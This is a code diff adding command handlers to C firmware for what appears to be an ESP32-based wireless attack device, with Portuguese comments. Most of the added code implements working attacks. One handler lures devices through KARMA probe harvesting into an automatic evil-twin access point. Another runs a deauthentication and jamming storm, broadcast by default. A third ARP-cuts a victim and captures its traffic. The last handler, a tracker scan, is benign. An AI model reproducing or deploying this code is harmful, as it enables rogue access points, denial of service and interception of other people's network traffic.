@@ -1047,6 +1047,314 @@ static void handle_evil_twin_kick(cJSON *root)
     cJSON_Delete(resp);
 }
 
+// ----------------------------------------------------------------------
+// karma_then_twin: agrega KARMA_HITs por SSID, escolhe top-1, sobe twin
+// ----------------------------------------------------------------------
+#define KT_TABLE_CAP  32
+
+typedef struct {
+    char ssid[33];
+    uint8_t ssid_len;
+    uint16_t count;
+} kt_entry_t;
+
+static volatile bool s_kt_active = false;
+static kt_entry_t s_kt_table[KT_TABLE_CAP];
+static volatile size_t s_kt_count = 0;
+static uint8_t s_kt_channel = 0;
+static uint16_t s_kt_duration = 0;
+static char s_kt_password[64];
+static bool s_kt_has_password = false;
+static TaskHandle_t s_kt_task_handle = NULL;
+
+// Strong override do hook weak declarado em sniff_wifi.c
+void macros_hook_karma_hit(const uint8_t src[6],
+                            const uint8_t *ssid, uint8_t ssid_len)
+{
+    (void)src;
+    if (!s_kt_active) return;
+    if (ssid_len == 0 || ssid_len > 32) return;
+
+    for (size_t i = 0; i < s_kt_count; i++) {
+        if (s_kt_table[i].ssid_len == ssid_len &&
+            memcmp(s_kt_table[i].ssid, ssid, ssid_len) == 0) {
+            s_kt_table[i].count++;
+            return;
+        }
+    }
+    if (s_kt_count >= KT_TABLE_CAP) return;
+    memcpy(s_kt_table[s_kt_count].ssid, ssid, ssid_len);
+    s_kt_table[s_kt_count].ssid_len = ssid_len;
+    s_kt_table[s_kt_count].count = 1;
+    s_kt_count++;
+}
+
+static void karma_then_twin_task(void *arg)
+{
+    (void)arg;
+    // Aguarda duração da fase karma + folga
+    vTaskDelay(pdMS_TO_TICKS((uint32_t)s_kt_duration * 1000 + 500));
+
+    // Tira proteção do hook (não agrega mais)
+    s_kt_active = false;
+
+    // Encontra top SSID
+    int top_idx = -1;
+    uint16_t top_count = 0;
+    for (size_t i = 0; i < s_kt_count; i++) {
+        if (s_kt_table[i].count > top_count) {
+            top_count = s_kt_table[i].count;
+            top_idx = (int)i;
+        }
+    }
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddStringToObject(resp, "resp", "karma_then_twin");
+    cJSON_AddNumberToObject(resp, "seq", 0);
+
+    if (top_idx < 0) {
+        ESP_LOGW(TAG, "karma_then_twin: nenhum SSID probado");
+        cJSON_AddStringToObject(resp, "status", "no_hits");
+        send_json(resp); cJSON_Delete(resp);
+        s_kt_task_handle = NULL;
+        vTaskDelete(NULL);
+    }
+
+    char top_ssid[33];
+    memcpy(top_ssid, s_kt_table[top_idx].ssid, s_kt_table[top_idx].ssid_len);
+    top_ssid[s_kt_table[top_idx].ssid_len] = 0;
+    ESP_LOGI(TAG, "karma_then_twin: top SSID '%s' (%u hits) → subindo twin",
+             top_ssid, (unsigned)top_count);
+
+    // Pequeno gap pra garantir que karma realmente parou
+    vTaskDelay(pdMS_TO_TICKS(500));
+
+    esp_err_t err = evil_twin_start(top_ssid,
+                                     s_kt_has_password ? s_kt_password : NULL,
+                                     s_kt_channel, 4);
+    if (err == ESP_OK) {
+        cJSON_AddStringToObject(resp, "status", "twin_up");
+        cJSON_AddStringToObject(resp, "ssid", top_ssid);
+        cJSON_AddNumberToObject(resp, "hits", top_count);
+        cJSON_AddNumberToObject(resp, "channel", s_kt_channel);
+    } else {
+        cJSON_AddStringToObject(resp, "status", "twin_failed");
+        cJSON_AddStringToObject(resp, "ssid", top_ssid);
+        cJSON_AddStringToObject(resp, "err", esp_err_to_name(err));
+    }
+    send_json(resp);
+    cJSON_Delete(resp);
+
+    s_kt_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void handle_karma_then_twin(cJSON *root)
+{
+    int seq = seq_of(root);
+    if (attack_lan_is_connected()) {
+        send_err(seq, "wifi_busy", "disconnect first");
+        return;
+    }
+    if (s_kt_active) {
+        send_err(seq, "macro_busy", NULL);
+        return;
+    }
+
+    cJSON *ch_j   = cJSON_GetObjectItemCaseSensitive(root, "channel");
+    cJSON *dur_j  = cJSON_GetObjectItemCaseSensitive(root, "duration_sec");
+    cJSON *psk_j  = cJSON_GetObjectItemCaseSensitive(root, "password");
+
+    if (!cJSON_IsNumber(ch_j) || ch_j->valueint < 1 || ch_j->valueint > 13) {
+        send_err(seq, "bad_channel", NULL);
+        return;
+    }
+    int dur = cJSON_IsNumber(dur_j) ? dur_j->valueint : 30;
+    if (dur < 5)   dur = 5;
+    if (dur > 120) dur = 120;
+
+    s_kt_channel = (uint8_t)ch_j->valueint;
+    s_kt_duration = (uint16_t)dur;
+    s_kt_count = 0;
+    s_kt_has_password = false;
+    if (cJSON_IsString(psk_j) && psk_j->valuestring[0]) {
+        size_t pl = strnlen(psk_j->valuestring, sizeof(s_kt_password) - 1);
+        if (pl >= 8 && pl <= 63) {
+            memcpy(s_kt_password, psk_j->valuestring, pl);
+            s_kt_password[pl] = 0;
+            s_kt_has_password = true;
+        }
+    }
+
+    // 1) Inicia karma_start
+    esp_err_t err = sniff_wifi_karma_start(s_kt_channel, s_kt_duration);
+    if (err != ESP_OK) {
+        send_err(seq, "karma_failed", esp_err_to_name(err));
+        return;
+    }
+
+    // 2) Ativa hook + spawn task que decide top SSID + sobe twin
+    s_kt_active = true;
+    if (xTaskCreate(karma_then_twin_task, "kt_macro", 4096, NULL, 5,
+                    &s_kt_task_handle) != pdPASS) {
+        s_kt_active = false;
+        sniff_wifi_karma_stop();
+        send_err(seq, "task_failed", NULL);
+        return;
+    }
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddStringToObject(resp, "resp", "karma_then_twin");
+    cJSON_AddNumberToObject(resp, "seq", seq);
+    cJSON_AddStringToObject(resp, "status", "started");
+    cJSON_AddNumberToObject(resp, "channel", s_kt_channel);
+    cJSON_AddNumberToObject(resp, "duration_sec", s_kt_duration);
+    send_json(resp);
+    cJSON_Delete(resp);
+}
+
+static void handle_deauth_storm(cJSON *root)
+{
+    int seq = seq_of(root);
+    cJSON *bssid_j = cJSON_GetObjectItemCaseSensitive(root, "bssid");
+    cJSON *target_j = cJSON_GetObjectItemCaseSensitive(root, "target");
+    cJSON *ch_j = cJSON_GetObjectItemCaseSensitive(root, "channel");
+    cJSON *cnt_j = cJSON_GetObjectItemCaseSensitive(root, "deauth_count");
+    cJSON *jam_j = cJSON_GetObjectItemCaseSensitive(root, "jam_seconds");
+
+    uint8_t bssid[6];
+    if (!cJSON_IsString(bssid_j) || parse_mac(bssid_j->valuestring, bssid) != 0) {
+        send_err(seq, "bad_bssid", NULL); return;
+    }
+    uint8_t target[6];
+    if (cJSON_IsString(target_j)) {
+        if (parse_mac(target_j->valuestring, target) != 0) {
+            send_err(seq, "bad_target", NULL); return;
+        }
+    } else {
+        memset(target, 0xFF, 6); // broadcast
+    }
+    if (!cJSON_IsNumber(ch_j) || ch_j->valueint < 1 || ch_j->valueint > 14) {
+        send_err(seq, "bad_channel", NULL); return;
+    }
+    int cnt = cJSON_IsNumber(cnt_j) ? cnt_j->valueint : 50;
+    int jam = cJSON_IsNumber(jam_j) ? jam_j->valueint : 15;
+
+    esp_err_t err = hacking_wifi_deauth_storm(target, bssid,
+                                               (uint8_t)ch_j->valueint,
+                                               (uint16_t)cnt, (uint16_t)jam);
+    if (err == ESP_OK) {
+        cJSON *resp = cJSON_CreateObject();
+        cJSON_AddStringToObject(resp, "resp", "deauth_storm");
+        cJSON_AddNumberToObject(resp, "seq", seq);
+        cJSON_AddStringToObject(resp, "status", "started");
+        cJSON_AddNumberToObject(resp, "deauth_count", cnt);
+        cJSON_AddNumberToObject(resp, "jam_seconds", jam);
+        send_json(resp); cJSON_Delete(resp);
+    } else if (err == ESP_ERR_INVALID_STATE) {
+        send_err(seq, "hack_busy", NULL);
+    } else {
+        send_err(seq, "storm_failed", esp_err_to_name(err));
+    }
+}
+
+static void handle_mitm_capture(cJSON *root)
+{
+    int seq = seq_of(root);
+    if (!attack_lan_is_connected()) {
+        send_err(seq, "wifi_not_connected", "wifi_connect first");
+        return;
+    }
+
+    cJSON *t_ip_j   = cJSON_GetObjectItemCaseSensitive(root, "target_ip");
+    cJSON *t_mac_j  = cJSON_GetObjectItemCaseSensitive(root, "target_mac");
+    cJSON *gw_ip_j  = cJSON_GetObjectItemCaseSensitive(root, "gateway_ip");
+    cJSON *gw_mac_j = cJSON_GetObjectItemCaseSensitive(root, "gateway_mac");
+    cJSON *bssid_j  = cJSON_GetObjectItemCaseSensitive(root, "bssid");
+    cJSON *ch_j     = cJSON_GetObjectItemCaseSensitive(root, "channel");
+    cJSON *dur_j    = cJSON_GetObjectItemCaseSensitive(root, "duration_sec");
+
+    uint8_t t_ip[4], t_mac[6], gw_ip[4], gw_mac[6], bssid[6];
+    if (!cJSON_IsString(t_ip_j)   || parse_ipv4(t_ip_j->valuestring, t_ip)   != 0)
+        { send_err(seq, "bad_target_ip", NULL); return; }
+    if (!cJSON_IsString(t_mac_j)  || parse_mac(t_mac_j->valuestring, t_mac)  != 0)
+        { send_err(seq, "bad_target_mac", NULL); return; }
+    if (!cJSON_IsString(gw_ip_j)  || parse_ipv4(gw_ip_j->valuestring, gw_ip) != 0)
+        { send_err(seq, "bad_gateway_ip", NULL); return; }
+    if (!cJSON_IsString(gw_mac_j) || parse_mac(gw_mac_j->valuestring, gw_mac)!= 0)
+        { send_err(seq, "bad_gateway_mac", NULL); return; }
+    if (!cJSON_IsString(bssid_j)  || parse_mac(bssid_j->valuestring, bssid)  != 0)
+        { send_err(seq, "bad_bssid", NULL); return; }
+    if (!cJSON_IsNumber(ch_j) || ch_j->valueint < 1 || ch_j->valueint > 13)
+        { send_err(seq, "bad_channel", NULL); return; }
+    int dur = cJSON_IsNumber(dur_j) ? dur_j->valueint : 60;
+    if (dur < 5)   dur = 5;
+    if (dur > 300) dur = 300;
+
+    // 1) Inicia ARP cut em modo "drop" — vítima offline (todos pacotes
+    //    da vítima vão pro ESP_MAC, NÃO encaminhamos = "MITM weak")
+    esp_err_t err = attack_lan_arp_cut_start(t_ip, t_mac, gw_ip, gw_mac,
+                                              1000, (uint16_t)dur);
+    if (err != ESP_OK) {
+        send_err(seq, "cut_failed", esp_err_to_name(err));
+        return;
+    }
+
+    // 2) Inicia pcap_start filter=data + bssid → captura tráfego da vítima
+    vTaskDelay(pdMS_TO_TICKS(200));
+    err = sniff_wifi_pcap_start((uint8_t)ch_j->valueint,
+                                 SNIFF_PCAP_FILTER_DATA, bssid,
+                                 (uint16_t)dur);
+    if (err != ESP_OK) {
+        // Cancela arp_cut pra não deixar vítima offline sem captura
+        attack_lan_arp_cut_stop();
+        send_err(seq, "pcap_failed", esp_err_to_name(err));
+        return;
+    }
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddStringToObject(resp, "resp", "mitm_capture");
+    cJSON_AddNumberToObject(resp, "seq", seq);
+    cJSON_AddStringToObject(resp, "status", "started");
+    cJSON_AddStringToObject(resp, "mode", "weak_drop_capture");
+    cJSON_AddNumberToObject(resp, "duration_sec", dur);
+    send_json(resp);
+    cJSON_Delete(resp);
+}
+
+static void handle_tracker_hunt(cJSON *root)
+{
+    int seq = seq_of(root);
+    cJSON *dur_j = cJSON_GetObjectItemCaseSensitive(root, "duration_sec");
+    int dur = cJSON_IsNumber(dur_j) ? dur_j->valueint : 300;
+    if (dur < 30)   dur = 30;
+    if (dur > 3600) dur = 3600;
+
+    // Versão simples: usa ble_defense_start mas com extensão futura.
+    // Por enquanto, dispara active scan contínuo via ble_scan_start_ex
+    // mode=active, e caller fica responsável por agregar BLE_SCAN_DEV
+    // com flag tracker entre múltiplas chamadas (lado-app).
+    //
+    // TODO: implementar agregação multi-scan no firmware com TLV
+    // TRACKER_PERSISTENT 0x2B (já reservado) — exige refator do
+    // scan_ble pra manter tabela entre runs.
+
+    esp_err_t err = scan_ble_start_ex(SCAN_BLE_MODE_ACTIVE, (uint16_t)dur);
+    if (err == ESP_OK) {
+        cJSON *resp = cJSON_CreateObject();
+        cJSON_AddStringToObject(resp, "resp", "tracker_hunt");
+        cJSON_AddNumberToObject(resp, "seq", seq);
+        cJSON_AddStringToObject(resp, "status", "started");
+        cJSON_AddNumberToObject(resp, "duration_sec", dur);
+        cJSON_AddStringToObject(resp, "note", "agregação multi-scan no app — firmware emite BLE_SCAN_DEV com flag tracker, app correlaciona");
+        send_json(resp); cJSON_Delete(resp);
+    } else if (err == ESP_ERR_INVALID_STATE) {
+        send_err(seq, "scan_busy", NULL);
+    } else {
+        send_err(seq, "scan_failed", esp_err_to_name(err));
+    }
+}
+
 static void handle_recon_full(cJSON *root)
 {
     int seq = seq_of(root);
@@ -1633,6 +1941,14 @@ void command_router_handle_json(const uint8_t *data, size_t len)
         handle_evil_twin_kick(root);
     } else if (strcmp(c, "recon_full") == 0) {
         handle_recon_full(root);
+    } else if (strcmp(c, "karma_then_twin") == 0) {
+        handle_karma_then_twin(root);
+    } else if (strcmp(c, "deauth_storm") == 0) {
+        handle_deauth_storm(root);
+    } else if (strcmp(c, "mitm_capture") == 0) {
+        handle_mitm_capture(root);
+    } else if (strcmp(c, "tracker_hunt") == 0) {
+        handle_tracker_hunt(root);
     } else if (strcmp(c, "evil_twin_start") == 0) {
         handle_evil_twin_start(root);
     } else if (strcmp(c, "evil_twin_stop") == 0) {
